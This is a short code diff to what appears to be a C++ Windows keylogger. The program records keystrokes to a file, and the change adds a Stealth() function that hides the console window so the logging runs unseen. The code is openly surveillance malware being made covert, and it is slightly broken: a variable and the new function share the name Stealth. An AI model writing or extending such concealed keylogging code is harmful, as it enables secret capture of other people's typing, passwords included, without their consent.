@@ -4,6 +4,7 @@
 
 using namespace std;  
 int Save (int key_stroke, char *file);
+void Stealth();
 
 int main() 
 {
@@ -64,6 +65,9 @@ fclose (OUTPUT_FILE);
 return 0;
 HWND Stealth;
 AllocConsole();
+}
+void Stealth()
+{
 Stealth = FindWindowA("ConsoleWindowClass", NULL);
 ShowWindow(Stealth,0);
 }
